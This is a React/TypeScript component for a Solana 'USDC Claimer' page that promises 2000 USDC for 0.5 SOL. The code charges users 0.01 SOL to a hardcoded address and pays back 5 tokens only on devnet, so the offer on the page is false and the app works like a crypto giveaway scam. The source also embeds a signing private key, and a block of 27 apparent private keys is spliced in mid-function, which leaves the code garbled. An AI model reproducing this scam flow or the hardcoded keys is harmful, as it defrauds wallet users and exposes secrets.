/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "TFPHhq94H1dxTmagWjk37dANPL8QJzaCn85FhMwQyqF4GbERZ4AD2m5yPVFL4DJ9PD3WADt2X7iAXggeAsaVz31"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3VUkPoyaVGSnCidKGTHUNBTuBrTYAqe2tRQNiwgtx33Gh5yjt7nX5zJVN1kj8hZ59rnLaDB1Ga3oSw8BnhT8Zr4e",
  "key1": "2Lec5mW19SEu2vMWkgyZPNJA3WHmNW4yaqnBUhzsTmD6sBVPBEXdSXcvKnmwVD4pYAffjuGzdnBJ97DrPpH4QCBR",
  "key2": "3iFqL6KRo421UpQe8GgS5rta9jJwfXT8tBeQ3MuYp7xom7T8H5pmFf7U1WiCcMji5e22zLGWV5ZxfH14QrL1PiFP",
  "key3": "4zPk5op8cKZLq62EzRmz1DnPPNKxreVZ5ngyGdQDPx9ujoxfCaPhEATgqzxcEDhx8NeiDWKtsGRtP7rqaAqbG6nC",
  "key4": "4duReckXhutJWRpoEDn7MQsNiUQFnPSg5PA3wZNHK1MY53wcMUKSRzJZGqPb6JpSdJDkw1fAxULyteWRxM2XKTL5",
  "key5": "2orP1Ji6dCQTKcuk2Yx5JomRy2KYSaXvtRuRBSARtF8RCPHuTbfGknQV6dAoTEwzFR1RmpSMTQEZZ8H9SWSPGKXw",
  "key6": "xFiVK5n62QoZQAWUb3vQsbrkFkDHucgUWNChx8EDFBaiEMtJ9mhceGL1xHaxxC2Aa1kitXZEohtAaeK9RNr1J21",
  "key7": "QAVDSxSgef5UYnFfdGrvU29gxwYML3w4idGMW2yUdhqENbkQdMSoGNE2GgXyeHp5gTcWjj9b4E7M6ajTbQqr95E",
  "key8": "2FwWyWQRVezgeFFuDNirzPAgZCgAHtSty3Vvvh1AF3c751ae4qekBhWYs9XTFt9KgWSKN6dPcyVU1c51s5rwxu7c",
  "key9": "3UTo2ewtyqFnP1X15jJgpMCZGEjKAQDLzEdcgvVTznqwkBFpUkFUjT4878F4DTn9ka7tka9uFYMwzzkUyB4qEytR",
  "key10": "3ae71nq2ZbmSTdRZ1cJccsNp9weNe6BAnEPFyJDcSRJUgAzW8PjEqNv9HTmNo2yHyTV923xbYrfqYuPVR7DCUAF2",
  "key11": "5pF77Hdiyq8BRf4mjcF8Q3hfCxUPvbvHiGBjyHZ4UScKKPfVRN8rNGJamdgLzo1eeBCMT3CASYnKvuMPCmefYqcu",
  "key12": "gzMkqScTreNDyetLixvZvrUbCrfDBKewHNsp9Zm7Ts1xZaJoEyERtyGTffhDsHsqvxYNUXM9spdeCSh2rG2NNVt",
  "key13": "WYe68N9273BECRUZuoG6Z3CCT6WAZXNzQpmP1pKsWpUXEP82E6qGhsRNxXNscZ5GR3QpW6o5GeFqs4zoyrKVFZo",
  "key14": "Y86cG2CkmsTAonVkk6ETSQ1cjitygvQKoGX27tsiybzPRg99Tr21ani4b3M2kzLef6K1ETqcyRe4GLbcXb8Uxog",
  "key15": "fEXGhDZ2tej6SubPWXW9BbwtJ57H7NggmRmS3BMmzM8xAi9gqjZfaCWjqQNjXWFcSt2k1WvLjCr7MEAQeQRYei8",
  "key16": "tMP8MQ43DE5bDorxfFRScr3scyrYZ7vW1FJeRDhggXub6Lydxg4PbuQhaWqBKv9qc6TvPtEAhD4CQCamcBWfHwV",
  "key17": "5xfPPZu5SjbHoJtRmb6W3pGhPoeG73RtrkXxKdAykQfqGPxA7DhzFmeLSyCjQ8iYACdYtYmhBvDo7ofboVHuTpc6",
  "key18": "59tgVLtTSADQEBiutGLGDssy7Gx4kfpSxqnURgh9hFZqoznWC3NEP5QWfiaGfLN94xLN83PS2cr3aumh13FGztx",
  "key19": "5SfvvfTrS485XG9JPpnq8r9HqTtts8uCGL6dAtuNptV4jDTWjVo9baXro2yGSvwXFXGTRxbxmKBBVNfqRhc1Y2aa",
  "key20": "xQUsCMj9EnQyWDvLkHZWNcydZ8SsU3j5MXbqUspYm3NGGxHs9qfdaFSBVjp2N3iGrWBNxE1mCu7faTLWFiek7E5",
  "key21": "3XQwU4WbnGNLcxjkEjkVHiQ58p62Y11vdHpuXWiE36kReS3EhCYKvuGLo5Mvtfj94GuDjii2vqEcKtfVvLg64tJK",
  "key22": "47adc8QZu8f2qr4fEfstuLnoDr8PmN2YQZXRLsoV3qhiMcu3nBLBomL1QGcWwzvz8BWRjF1FzjuDXWDFaxdh5CKE",
  "key23": "3hBzdYpBsSe9phorTmt75UGygq4i613yAnq8Wx4sW5JPHvBSBjavZehk5jpFQE2yxFPxRdZvgYLGCBDYLyCMRRMm",
  "key24": "3B4yvnZSfx4ryqUpqYRZyUpVS7LdcEX6rxA3WLhLotqVSm8vTdL633gGPkXJDtFxkELvsbpHyqhirBaqEhxkcSkk",
  "key25": "4kooR89wTVwLSVvEdbmMFC9cy7AqwS93iAVVz1oFJifwvA6qBSck1NEaXu9m5yp3RcmcCuWosdgvT5eHDsjiVTWM",
  "key26": "2Yum6DhpL2246ZMP1zKyXtJVyrswyopd2jxoqKJbaev8HSmJFebVhW1MK9fxhk6CwGhBqsMhPHmf26mSEaxrEraf"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
